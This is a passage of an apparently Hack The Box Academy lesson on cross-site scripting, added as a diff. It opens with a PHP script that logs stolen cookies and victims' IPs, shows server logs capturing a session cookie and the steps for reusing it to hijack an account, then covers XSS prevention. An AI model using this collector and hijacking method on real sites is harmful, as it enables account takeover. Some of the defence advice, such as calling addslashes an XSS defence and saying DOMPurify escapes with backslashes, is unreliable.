+    <span class="hljs-keyword">foreach</span> ($list <span class="hljs-keyword">as</span> $key =&gt; $value) {
+        $cookie = urldecode($value);
+        $file = fopen(<span class="hljs-string">"cookies.txt"</span>, <span class="hljs-string">"a+"</span>);
+        fputs($file, <span class="hljs-string">"Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n"</span>);
+        fclose($file);
+    }
+}
+<span class="hljs-meta">?&gt;</span></span>
+</code></pre>
+<p>Now, we wait for the victim to visit the vulnerable page and view our XSS payload. Once they do, we will get two requests on our server, one for <code>script.js</code>, which in turn will make another request with the cookie value:</p>
+<p>Session Hijacking</p>
+<pre><code class="lang-shell-session"><span class="hljs-number">10.10.10.10:52798</span> <span class="hljs-string">[200]</span>: /script.js
+<span class="hljs-number">10.10.10.10:52799</span> <span class="hljs-string">[200]</span>: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
+</code></pre>
+<p>As mentioned earlier, we get the cookie value right in the terminal, as we can see. However, since we prepared a PHP script, we also get the <code>cookies.txt</code> file with a clean log of cookies:</p>
+<p>Session Hijacking</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ cat cookies.txt 
+Victim <span class="hljs-string">IP:</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.1</span> | <span class="hljs-string">Cookie:</span> cookie=f904f93c949d19d870911bf8b05fe7b2
+</code></pre>
+<p>Finally, we can use this cookie on the <code>login.php</code> page to access the victim's account. To do so, once we navigate to <code>/hijacking/login.php</code>, we can click <code>Shift+F9</code> in Firefox to reveal the <code>Storage</code> bar in the Developer Tools. Then, we can click on the <code>+</code> button on the top right corner and add our cookie, where the <code>Name</code> is the part before <code>=</code> and the <code>Value</code> is the part after <code>=</code> from our stolen cookie:</p>
+<p><img src="storage\modules\103\xss\_blind\_set\_cookie\_2.jpg" alt=""></p>
+<p>Once we set our cookie, we can refresh the page and we will get access as the victim:</p>
+<p><img src="storage\modules\103\xss\_blind\_hijacked\_session.jpg" alt=""></p>
+<h2 id="xss-prevention">XSS Prevention</h2>
+<hr>
+<p>By now, we should have a good understanding of what an XSS vulnerability is and its different types, how to detect an XSS vulnerability, and how to exploit XSS vulnerabilities. We will conclude the module by learning how to defend against XSS vulnerabilities.</p>
+<p>As discussed previously, XSS vulnerabilities are mainly linked to two parts of the web application: A <code>Source</code> like a user input field and a <code>Sink</code> that displays the input data. These are the main two points that we should focus on securing, both in the front-end and in the back-end.</p>
+<p>The most important aspect of preventing XSS vulnerabilities is proper input sanitization and validation on both the front and back end. In addition to that, other security measures can be taken to help prevent XSS attacks.</p>
+<hr>
+<h3 id="front-end">Front-end</h3>
+<p>As the front-end of the web application is where most (but not all) of the user input is taken from, it is essential to sanitize and validate the user input on the front-end using JavaScript.</p>
+<p><strong>Input Validation</strong></p>
+<p>For example, in the exercise of the <code>XSS Discovery</code> section, we saw that the web application will not allow us to submit the form if the email format is invalid. This was done with the following JavaScript code:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">function validateEmail(email) {
+    const re = /^(([^&lt;&gt;()[<span class="hljs-tag">\<span class="hljs-name">]</span></span><span class="hljs-tag">\<span class="hljs-name">\</span></span>.,;:<span class="hljs-tag">\<span class="hljs-name">s</span></span>@<span class="hljs-tag">\<span class="hljs-name">"</span></span>]+(<span class="hljs-tag">\<span class="hljs-name">.</span><span class="hljs-string">[^&lt;&gt;()[\]</span></span><span class="hljs-tag">\<span class="hljs-name">\</span></span>.,;:<span class="hljs-tag">\<span class="hljs-name">s</span></span>@<span class="hljs-tag">\<span class="hljs-name">"</span></span>]+)*)|(<span class="hljs-tag">\<span class="hljs-name">"</span></span>.+<span class="hljs-tag">\<span class="hljs-name">"</span></span>))@((<span class="hljs-tag">\<span class="hljs-name">[</span><span class="hljs-string">[0-9]</span><span class="hljs-string">{1,3}</span></span><span class="hljs-tag">\<span class="hljs-name">.</span><span class="hljs-string">[0-9]</span><span class="hljs-string">{1,3}</span></span><span class="hljs-tag">\<span class="hljs-name">.</span><span class="hljs-string">[0-9]</span><span class="hljs-string">{1,3}</span></span><span class="hljs-tag">\<span class="hljs-name">.</span><span class="hljs-string">[0-9]</span><span class="hljs-string">{1,3}</span></span><span class="hljs-tag">\<span class="hljs-name">]</span></span>)|(([a-zA-Z<span class="hljs-tag">\<span class="hljs-name">-</span></span>0-9]+<span class="hljs-tag">\<span class="hljs-name">.</span></span>)+[a-zA-Z]{2,}))<span class="hljs-formula">$/;
+    return re.test($</span>("#login input[name=email]").val());
+}
+</code></pre>
+<p>As we can see, this code is testing the <code>email</code> input field and returning <code>true</code> or <code>false</code> whether it matches the Regex validation of an email format.</p>
+<p><strong>Input Sanitization</strong></p>
+<p>In addition to input validation, we should always ensure that we do not allow any input with JavaScript code in it, by escaping any special characters. For this, we can utilize the <a href="https://github.com/cure53/DOMPurify">DOMPurify</a> JavaScript library, as follows:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"dist/purify.min.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+let clean = DOMPurify.sanitize( dirty );
+</code></pre>
+<p>This will escape any special characters with a backslash <code>\</code>, which should help ensure that a user does not send any input with special characters (like JavaScript code), which should prevent vulnerabilities like DOM XSS.</p>
+<p><strong>Direct Input</strong></p>
+<p>Finally, we should always ensure that we never use user input directly within certain HTML tags, like:</p>
+<ol>
+<li>JavaScript code <code>&lt;script&gt;&lt;/script&gt;</code></li>
+<li>CSS Style Code <code>&lt;style&gt;&lt;/style&gt;</code></li>
+<li>Tag/Attribute Fields <code>&lt;div name='INPUT'&gt;&lt;/div&gt;</code></li>
+<li>HTML Comments <code>&lt;!-- --&gt;</code></li>
+</ol>
+<p>If user input goes into any of the above examples, it can inject malicious JavaScript code, which may lead to an XSS vulnerability. In addition to this, we should avoid using JavaScript functions that allow changing raw text of HTML fields, like:</p>
+<ul>
+<li><code>DOM.innerHTML</code></li>
+<li><code>DOM.outerHTML</code></li>
+<li><code>document.write()</code></li>
+<li><code>document.writeln()</code></li>
+<li><code>document.domain</code></li>
+</ul>
+<p>And the following jQuery functions:</p>
+<ul>
+<li><code>html()</code></li>
+<li><code>parseHTML()</code></li>
+<li><code>add()</code></li>
+<li><code>append()</code></li>
+<li><code>prepend()</code></li>
+<li><code>after()</code></li>
+<li><code>insertAfter()</code></li>
+<li><code>before()</code></li>
+<li><code>insertBefore()</code></li>
+<li><code>replaceAll()</code></li>
+<li><code>replaceWith()</code></li>
+</ul>
+<p>As these functions write raw text to the HTML code, if any user input goes into them, it may include malicious JavaScript code, which leads to an XSS vulnerability.</p>
+<hr>
+<h3 id="back-end">Back-end</h3>
+<p>On the other end, we should also ensure that we prevent XSS vulnerabilities with measures on the back-end to prevent Stored and Reflected XSS vulnerabilities. As we saw in the <code>XSS Discovery</code> section exercise, even though it had front-end input validation, this was not enough to prevent us from injecting a malicious payload into the form. So, we should have XSS prevention measures on the back-end as well. This can be achieved with Input and Output Sanitization and Validation, Server Configuration, and Back-end Tools that help prevent XSS vulnerabilities.</p>
+<p><strong>Input Validation</strong></p>
+<p>Input validation in the back-end is quite similar to the front-end, and it uses Regex or library functions to ensure that the input field is what is expected. If it does not match, then the back-end server will reject it and not display it.</p>
+<p>An example of E-Mail validation on a PHP back-end is the following:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-keyword">if</span> (filter_var($_GET[<span class="hljs-string">'email'</span>], FILTER_VALIDATE_EMAIL)) {
+    <span class="hljs-regexp">//</span> <span class="hljs-keyword">do</span> task
+} <span class="hljs-keyword">else</span> {
+    <span class="hljs-regexp">//</span> reject input - <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> display it
+}
+</code></pre>
+<p>For a NodeJS back-end, we can use the same JavaScript code mentioned earlier for the front-end.</p>
+<p><strong>Input Sanitization</strong></p>
+<p>When it comes to input sanitization, then the back-end plays a vital role, as front-end input sanitization can be easily bypassed by sending custom <code>GET</code> or <code>POST</code> requests. Luckily, there are very strong libraries for various back-end languages that can properly sanitize any user input, such that we ensure that no injection can occur.</p>
+<p>For example, for a PHP back-end, we can use the <code>addslashes</code> function to sanitize user input by escaping special characters with a backslash:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-function"><span class="hljs-title">addslashes</span><span class="hljs-params">($_GET[<span class="hljs-string">'email'</span>])</span></span>
+</code></pre>
+<p>In any case, direct user input (e.g. <code>$_GET['email']</code>) should never be directly displayed on the page, as this can lead to XSS vulnerabilities.</p>
+<p>For a NodeJS back-end, we can also use the <a href="https://github.com/cure53/DOMPurify">DOMPurify</a> library as we did with the front-end, as follows:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-keyword">import</span> DOMPurify <span class="hljs-keyword">from</span> <span class="hljs-string">'dompurify'</span>;
+<span class="hljs-keyword">var</span> clean = DOMPurify.sanitize(dirty);
+</code></pre>
+<p><strong>Output HTML Encoding</strong></p>
+<p>Another important aspect to pay attention to in the back-end is <code>Output Encoding</code>. This means that we have to encode any special characters into their HTML codes, which is helpful if we need to display the entire user input without introducing an XSS vulnerability. For a PHP back-end, we can use the <code>htmlspecialchars</code> or the <code>htmlentities</code> functions, which would encode certain special characters into their HTML codes (e.g. <code>&lt;</code> into <code>&amp;lt</code>), so the browser will display them correctly, but they will not cause any injection of any sort:</p>
+<p>Code: php</p>
+<pre><code class="lang-php">htmlentities($_GET[<span class="hljs-string">'email'</span>])<span class="hljs-comment">;</span>
+</code></pre>
+<p>For a NodeJS back-end, we can use any library that does HTML encoding, like <code>html-entities</code>, as follows:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-keyword">import</span> encode <span class="hljs-keyword">from</span> <span class="hljs-string">'html-entities'</span>;
+encode(<span class="hljs-string">'&lt;'</span>); <span class="hljs-comment">// -&gt; '&amp;lt;'</span>
+</code></pre>
+<p>Once we ensure that all user input is validated, sanitized, and encoded on output, we should significantly reduce the risk of having XSS vulnerabilities.</p>
+<p><strong>Server Configuration</strong></p>
+<p>In addition to the above, there are certain back-end web server configurations that may help in preventing XSS attacks, such as:</p>
+<ul>
+<li>Using HTTPS across the entire domain.</li>
+<li>Using XSS prevention headers.</li>
+<li>Using the appropriate Content-Type for the page, like <code>X-Content-Type-Options=nosniff</code>.</li>
+<li>Using <code>Content-Security-Policy</code> options, like <code>script-src 'self'</code>, which only allows locally hosted scripts.</li>
+<li>Using the <code>HttpOnly</code> and <code>Secure</code> cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.</li>
+</ul>
+<p>In addition to the above, having a good <code>Web Application Firewall (WAF)</code> can significantly reduce the chances of XSS exploitation, as it will automatically detect any type of injection going through HTTP requests and will automatically reject such requests. Furthermore, some frameworks provide built-in XSS protection, like <a href="https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-7.0">ASP.NET</a>.</p>
+<p>In the end, we must do our best to secure our web applications against XSS vulnerabilities using such XSS prevention techniques. Even after all of this is done, we should practice all of the skills we learned in this module and attempt to identify and exploit XSS vulnerabilities in any potential input fields, as secure coding and secure configurations may still leave gaps and vulnerabilities that can be exploited. If we practice defending the website using both <code>offensive</code> and <code>defensive</code> techniques, we should reach a reliable level of security against XSS vulnerabilities.</p>
+</div></body></html>
